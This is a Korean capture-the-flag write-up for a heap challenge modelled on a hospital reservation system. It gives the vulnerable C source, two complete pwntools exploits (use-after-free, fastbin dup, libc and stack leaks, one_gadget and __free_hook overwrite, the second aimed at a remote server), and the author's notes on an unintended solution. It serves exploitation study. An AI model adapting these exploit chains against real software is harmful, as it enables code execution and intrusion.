보호기법 : pie 만 해제, 나머지 다 걸림

![](https://i.imgur.com/6ERG8N3.png)


```c
// gcc -no-pie -fstack-protector-all -z relro -z now -o prob prob.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void setup_environment() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
}

struct patient {
    char name[0x10];
    char disease[0x10];
};

long int person_num = 0;
struct patient *person[10];
int reserve_list[10];

int reservation(){

    int num ;
    
    if(person_num >= 60){
        printf("Too many cancel!!");
        exit(0);
    }

    printf("what date will you make a reservation\n");
    
    printf("[1] 2024-3-1\n");
    printf("[2] 2024-3-2\n");
    printf("[3] 2024-3-3\n");
    printf("[4] 2024-3-4\n");
    printf("[5] 2024-3-5\n");
    printf("[6] 2024-3-6\n");
    printf("[7] 2024-3-7\n");
    printf("[8] 2024-3-8\n");
    printf("[9] 2024-3-9\n");
    printf("[10] 2024-3-10\n");
    printf(">>> ");

    scanf("%d", &num);
    if(num <1 || num > 10){
        printf("wrong index!!\n");
        return 0;
    }
    if(reserve_list[num-1] == 1){
        printf("already reserve\n");
        return 0;
    }
    person[num-1] = malloc(0x20);
    memset(person[num-1], 0, 8);
    printf("what is your name?\n");
    printf(">>> ");
    read(0, person[num-1]->name, 0x10);

    printf("what's wrong with you?\n");
    printf(">>> ");
    read(0, person[num-1]->disease, 0x10);
    reserve_list[num-1] = 1;

    
    person_num += 1;
}

int reservation_cancel(){
    
    int num;

    printf("What date are you going to cancel your reservation\n");
    for(int i = 0; i<10; i++){
        if(reserve_list[i] == 1){
            printf("[%d] 2024-3-%d\n", i+1, i+1);
        }
    }
    printf(">>> ");
    scanf("%d", &num);
    if(num < 1 || num > 10){
        printf("wrong index!!\n");
        return 0;
    }
    free(person[num-1]);
    reserve_list[num-1] = 0;
}

int reservation_edit(){

    int num;

    printf("What date are you going to modify your reservation\n");
    for(int i = 0; i<10; i++){
        if(reserve_list[i] == 1){
            printf("[%d] 2024-3-%d\n", i+1, i+1);
        }
    }
    printf(">>> ");
    scanf("%d", &num);
    if(num < 1 || num > 10){
        printf("wrong index!!\n");
        return 0;
    }

    if(reserve_list[num-1] == 0){
        printf("There is no reservation for this date.!!\n");
        return 0;
    }

    printf("edit your name\n");
    printf(">>> ");
    read(0, person[num-1]->name, 0x10);
    
    printf("edit your disease?\n");
    printf(">>> ");
    read(0, person[num-1]->disease, 0x10);

}

void view_reservation_list(){
    
    for(int i = 0; i<10; i++){
        if(reserve_list[i] == 1){
            printf("[%d] 2024-3-%d  (reserved)  name: %s, disease: %s\n", i+1, i+1, person[i]->name, person[i]->disease);
        }else{
            printf("[%d] 2024-3-%d  (not reserved)\n", i+1, i+1);
        }
    }
}

void review(){
    int l;

    while(1){
        printf("Length: ");
        scanf("%d", &l);
        if(l<0 || l >0x500){
            printf("wrong Length!!\n");
            continue;
        }
        break;
    }

    char *rev = malloc(l);

    printf("How was it? > ");
    read(0, rev, l-1);
    
    printf("Thank you\n");
}

int menu(){
    int num;
    while(1){
        printf("1. Reservation\n");
        printf("2. Reservation cancel\n");
        printf("3. edit reservation\n");
        printf("4. view reservation list\n");
        printf("5. review\n");
        printf("6. exit\n");
        printf(">>> ");
        scanf("%d", &num);
        if(num >= 1 && num <= 6){
            return num;
        }
        printf("wrong number\n\n");
    }
}

int main(){

    char phone_number[0x10];
    int n;

    setup_environment();    

    printf("Please write your phone number?\n");
    printf(">>> ");
    read(0, phone_number, 0xf);

    printf("hospital reserve system\n");
    while(1){   
        n = menu();

        switch(n){
            case 1:
                reservation();
                break;
            case 2:
                reservation_cancel();
                break;
            case 3:
                reservation_edit();
                break;
            case 4:
                view_reservation_list();
                break;
            case 5:
                review();
                break;
            case 6:
                return 0;
        }
    }
}
```

```python
from pwn import *

context.log_level= 'debug'

p = process("./prob")

pause()


p.sendafter(b">>> ", b'\x00\x00\x00\x00\x00\x00\x00\x00\x31\x00\x00\x00\x00\x00')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'aaa')
p.sendlineafter(b">>> ", b'aaa')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'2')
p.sendlineafter(b">>> ", b'aaa')
p.sendlineafter(b">>> ", b'aaa')

p.sendlineafter(b">>> ", b'2')
p.sendlineafter(b">>> ", b'1')

p.sendlineafter(b">>> ", b'5')
p.sendlineafter(b"Length: ", b'1104')
p.sendlineafter(b"> ", b'good')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'aaaaaaa')
p.sendlineafter(b">>> ", b'aaa')

p.sendlineafter(b">>> ", b'4')

p.recvuntil(b"aaaaaaa\x0a")
libc_leak = u64(p.recv(6)+b"\x00\x00")
libc_base = libc_leak - 0x3c4b98
environ = libc_base + 0x3c6f38
fake_chunk1 = 0x602048
one_gadget = libc_base + 0x45226

for i in range(42):
    p.sendlineafter(b">>> ", b'1')
    p.sendlineafter(b">>> ", b'10')
    p.sendlineafter(b">>> ", b'aaa')
    p.sendlineafter(b">>> ", b'aaa')
    
    p.sendlineafter(b">>> ", b'2')
    p.sendlineafter(b">>> ", b'10')    

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'10')
p.sendlineafter(b">>> ", b'aaa')
p.sendlineafter(b">>> ", b'aaa')
    
p.sendlineafter(b">>> ", b'2')
p.sendlineafter(b">>> ", b'1')

p.sendlineafter(b">>> ", b'2')
p.sendlineafter(b">>> ", b'2')

p.sendlineafter(b">>> ", b'2')
p.sendlineafter(b">>> ", b'1')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'aaa')
p.sendlineafter(b">>> ", b'aaa')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'2')
p.sendlineafter(b">>> ", b'aaa')
p.sendlineafter(b">>> ", b'aaa')

p.sendlineafter(b">>> ", b'3')
p.sendlineafter(b">>> ", b'1')
p.sendafter(b">>> ", p64(fake_chunk1))
p.sendlineafter(b">>> ", b'a')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'3')
p.sendlineafter(b">>> ", b'a')
p.sendlineafter(b">>> ", b'a')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'4')
p.sendlineafter(b">>> ", b'a')
p.sendafter(b">>> ", p64(environ-0x10))

p.sendlineafter(b">>> ", b'4')

p.recvuntil(b"[2] 2024-3-2  (reserved)  name: , disease: ")
stack_leak = u64(p.recv(6)+b"\x00\x00")
fake_chunk2_off = 0x118
fake_chunk2 = stack_leak-fake_chunk2_off

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'5')
p.sendlineafter(b">>> ", b'aaa')
p.sendlineafter(b">>> ", b'aaa')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'6')
p.sendlineafter(b">>> ", b'aaa')
p.sendlineafter(b">>> ", b'aaa')

p.sendlineafter(b">>> ", b'2')
p.sendlineafter(b">>> ", b'5')

p.sendlineafter(b">>> ", b'2')
p.sendlineafter(b">>> ", b'6')

p.sendlineafter(b">>> ", b'2')
p.sendlineafter(b">>> ", b'5')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'5')
p.sendlineafter(b">>> ", b'aaa')
p.sendlineafter(b">>> ", b'aaa')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'6')
p.sendlineafter(b">>> ", b'aaa')
p.sendlineafter(b">>> ", b'aaa')

p.sendlineafter(b">>> ", b'3')
p.sendlineafter(b">>> ", b'5')
p.sendlineafter(b">>> ", p64(fake_chunk2))
p.sendlineafter(b">>> ", b'a')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'7')
p.sendlineafter(b">>> ", b'a')
p.sendlineafter(b">>> ", b'a')

p.sendlineafter(b">>> ", b'1')
p.sendlineafter(b">>> ", b'8')
p.sendafter(b">>> ", b'\x00')
ex = b''
ex += b'a'*0x8
ex += p64(one_gadget)
p.sendafter(b">>> ", ex)

p.sendlineafter(b">>> ", b'6')

# print(hex(libc_base))



p.interactive()
```

![](https://i.imgur.com/izHrO1b.png)

취약점 : 우선 use after free 가 발생함, fastbin dup 가능.

우선 phone_num은 `b'\x00\x00\x00\x00\x00\x00\x00\x00\x31\x00\x00\x00\x00\x00'`
로 함, fake chunk의 header 역할


libc leak vector : 1로 할당, 해제 후 review에 0x500 정도 크기로 할당 요청을 하면 fastbin에 있던 chunk가 small bin으로 감, 재할당후 상위 8byte를 채워주고 view함수 실행되면 libc leak
이걸로 environ 주소와 one_gadget 주소를 구함

stack leak vector : 
![](https://i.imgur.com/FY73yls.png)
해당 부분을 fake chunk로 삼음, person_num이 0x31이 되도록 할당 해제를 반복함, 
그러면 person_num을 chunk의 header로 보고 해당 부분을 fast bin dup으로 chunk 할당
person 구조체 포인터 리스트를 overwrite가능, environ_add - 0x10 으로 overwrite

view함수 실행하면 stack add leak

마지막으로 stack주소를 알았으니 phone_num을 헤더로 하여 fast bin dup으로 chunk 할당, name부분이 canary, disease부분이 sfp+ret, name은 그냥 \\x00 입력, disease는 sfp 아무값으로 채우고 ret에 one_gadget 넣음

6으로 exit 하면 셸따임 
onegadget 조건은 rax == null 이여서 그냥 하면 됨

---
씨잇팔~!
언인텐 터짐
생각해보니 leak 한 다음에 걍 다시 포인터주소 hook으로 바꾸고
hook 수정하면 끝임

```python
from pwn import *

#context.log_level = "debug"

#r = process("./prob")
r = remote("58.123.193.108", 41004)
e = ELF("./prob")
libc = ELF("./libc-2.23.so")

sla = r.sendlineafter
sa = r.sendafter

def slog(name, addr): return success(": ".join([name, hex(addr)]))

def alloc(index, name, disease):
    sla(b'>>>', b'1')
    sla(b'>>>', str(index).encode())
    sa(b'>>>', name)
    sa(b'>>>', disease)

def delloc(index):
    sla(b'>>>', b'2')
    sla(b'>>>', str(index).encode())

def edit(index, name, disease):
    sla(b'>>>', b'3')
    sla(b'>>>', str(index).encode())
    sa(b'>>>', name)
    sa(b'>>>', disease)

def review(size, payload):
    sla(b'>>>', b'5')
    sla(b'Length:', str(size).encode())
    sa(b'it? >', payload)

sa(b'>>>', b'AAAA')

for _ in range(4):
    for i in range(10):
        alloc(i+1, b'A', b'B')
    for i in range(10):
        delloc(i+1)

alloc(1, b'a', b'b')
alloc(2, b'B', b'C')
alloc(3, b'D', b'E')
alloc(4, b'F', b'G')
alloc(5, b'H', b'I')
alloc(6, b'J', b'K')
delloc(4)
delloc(5)
delloc(4)


alloc(4, p64(0x602048), b'AAAA')
alloc(5, b'DDDD', b'EEEE')
alloc(7, b'AAAA', b'BBBB')
alloc(8, p64(0x601fa8), p64(0x601fb0))

sla(b'>>>', b'4')
r.recvuntil(b'[2]')
r.recvuntil(b'name: ')

libc_base = u64(r.recvn(6).ljust(8, b'\x00')) - 0x1191f0
slog("libc_base", libc_base)

free_hook = libc_base + libc.sym['__free_hook']
og = libc_base + 0x4527a

edit(8, p64(0x602300), p64(free_hook))
edit(2, p64(og), p64(og))

sla(b'>>>', b'2')
sla(b'>>>', b'7')

r.interactive()
```

역시 아무래도 pie 가 안걸려있으니 좀 그렇네. no pie에 임의 주소 쓰기 가능이면 libc가 leak된다는 것을 잊지 말자...
음.. 좀 고쳐보자면,, 일단 pie걸고 libc leak은 하던대로 함.. 
걍 2.27하고 tcache dup로 hook overwrite 하는게 편할듯. 
임의 주소 읽기 쓰기가 너무 큼.. 그건 없애는게 나을듯

아니 근데 그냥 library leak 하고 hook에 주소에 값 쓸 정도면 그냥 library에 shell code 넣으면 되는 거 아닌감..
